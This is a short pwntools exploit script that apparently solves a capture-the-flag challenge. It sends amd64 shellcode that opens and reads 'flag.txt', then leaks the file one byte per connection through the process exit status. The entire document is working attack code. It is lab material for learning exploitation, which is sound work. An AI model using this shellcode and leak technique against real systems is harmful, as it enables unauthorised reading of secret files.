#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

# shortcuts
def sla(delim,line): return p.sendlineafter(delim,line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "kitctf.me", "1338"

flag = ''

for i in range(46):
  p = remote(host,port)
  shellc = asm('''
  // open
  mov eax,0
  mov ecx, 0x67616C66
  mov [rsp],ecx
  mov ecx, 0x7478742E
  mov [rsp+4],ecx
  mov [rsp+8],eax
  mov rdi,rsp
  mov rsi,rax
  mov al,2
  syscall

  // read
  mov rdi,rax
  mov rsi,rsp
  mov edx,0x200
  mov eax,0
  syscall

  mov rdi,[rsi+%d]	/* leak flag byte with exit code */
  ''' % i)
  sla('> ', binascii.hexlify(shellc))
  flag += chr(int(rcu('exit status ', '.'),10))
  print(flag)
  p.close()
